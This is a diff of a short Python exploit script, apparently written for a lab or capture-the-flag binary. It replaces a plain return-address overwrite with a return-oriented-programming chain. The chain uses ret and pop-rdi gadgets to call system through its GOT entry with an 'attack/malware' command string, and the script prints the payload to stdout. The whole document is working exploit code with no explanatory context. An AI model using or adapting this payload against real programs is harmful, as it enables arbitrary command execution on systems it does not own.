@@ -8,9 +8,20 @@ import sys
 
 p64 = lambda v: struct.pack("<Q", v)
 
-FIXED_STACK_TOP = 0x721000801000
-malware = 0x4019B4
+POP_RDI_RET = 0x401C93
+RET = 0x401AC2
+system_got = 0x603038
 
-payload = b"A" * 24 + p64(malware)
+cmd_addr = 0x6030D0
+
+payload = (
+    b"attack/malware"
+    + b"\x00"
+    + b"A" * 7
+    + p64(RET)
+    + p64(POP_RDI_RET)
+    + p64(cmd_addr)
+    + p64(system_got)
+)
 
 sys.stdout.buffer.write(payload)
